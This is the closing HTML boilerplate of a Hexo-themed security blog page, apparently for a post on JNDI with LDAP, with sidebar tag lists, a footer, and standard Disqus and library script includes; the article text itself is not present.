<div class='content'>
    <ul class="entry">
    
        <li><a class="flat-box" target="_blank" href="http://blog.orleven.com">
            <div class='name'>orleven</div>
        </a></li>
    
        <li><a class="flat-box" target="_blank" href="http://www.warmeng.com">
            <div class='name'>warmeng</div>
        </a></li>
    
    </ul>
</div>
</section>

  <section class='m_widget categories'>
<div class='header'>Categories</div>
<div class='content'>
    
    <ul class="entry">
    
        <li><a class="flat-box" href="/categories/codereview/"><div class='name'>codereview</div><div class='badget'>10</div></a></li>
    
        <li><a class="flat-box" href="/categories/ctf/"><div class='name'>ctf</div><div class='badget'>6</div></a></li>
    
        <li><a class="flat-box" href="/categories/notes/"><div class='name'>notes</div><div class='badget'>24</div></a></li>
    
    </ul>
    
</div>
</section>

  
<div class="m_widget tagcloud">
    <div class="header">Tags</div>
    <div class='content'>
        <a href="/tags/bctf/" style="font-size: 14px; color: #808080">bctf</a> <a href="/tags/cms/" style="font-size: 18.5px; color: #202020">cms</a> <a href="/tags/ctf/" style="font-size: 14px; color: #808080">ctf</a> <a href="/tags/cve/" style="font-size: 17px; color: #404040">cve</a> <a href="/tags/ddctf/" style="font-size: 14px; color: #808080">ddctf</a> <a href="/tags/hitbxctf/" style="font-size: 14px; color: #808080">hitbxctf</a> <a href="/tags/mobile/" style="font-size: 14px; color: #808080">mobile</a> <a href="/tags/njctf/" style="font-size: 14px; color: #808080">njctf</a> <a href="/tags/others/" style="font-size: 15.5px; color: #606060">others</a> <a href="/tags/suctf/" style="font-size: 14px; color: #808080">suctf</a> <a href="/tags/vul/" style="font-size: 20px; color: #000">vul</a>
    </div>
</div>



      </aside>
      <script>setLoadingBarProgress(60);</script>
    </div>
  </div>
  <footer id="footer" class="clearfix">

	<div class="social-wrapper">
  	
      
        <a href="https://github.com/wh1t3p1g" class="social github"
          target="_blank" rel="external">
          <span class="icon icon-github"></span>
        </a>
      
        <a href="/atom.xml" class="social rss"
          target="_blank" rel="external">
          <span class="icon icon-rss"></span>
        </a>
      
    
  </div>
  
  <div>Theme <a href='https://github.com/stkevintan/hexo-theme-material-flow' class="codename">MaterialFlow</a> designed by <a href="http://keyin.me/" target="_blank">Kevin Tan</a>.</div>
  
</footer>


  <script>setLoadingBarProgress(80);</script>
  
<script>
  var disqus_shortname = '0kami';
  
  var disqus_url = 'http://blog.0kami.cn/2020/03/01/java/jndi-with-ldap/';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src='//cdn.bootcss.com/node-waves/0.7.5/waves.min.js'></script>
<script src="//cdn.bootcss.com/scrollReveal.js/3.3.2/scrollreveal.min.js"></script>
<script src="/js/jquery.fitvids.js"></script>
<script>
	var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
	var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
	var ALGOLIA_API_KEY = "";
	var ALGOLIA_APP_ID = "";
	var ALGOLIA_INDEX_NAME = "";
  var AZURE_SERVICE_NAME = "";
  var AZURE_INDEX_NAME = "";
  var AZURE_QUERY_KEY = "";
  var BAIDU_API_ID = "";
  var SEARCH_SERVICE = "hexo";
  var ROOT = "/"||"/";
  if(!ROOT.endsWith('/'))ROOT += '/';
</script>
<script src="/js/search.js"></script>
<script src="/js/app.js"></script>


  <script>setLoadingBarProgress(100);</script>
</body>
</html>
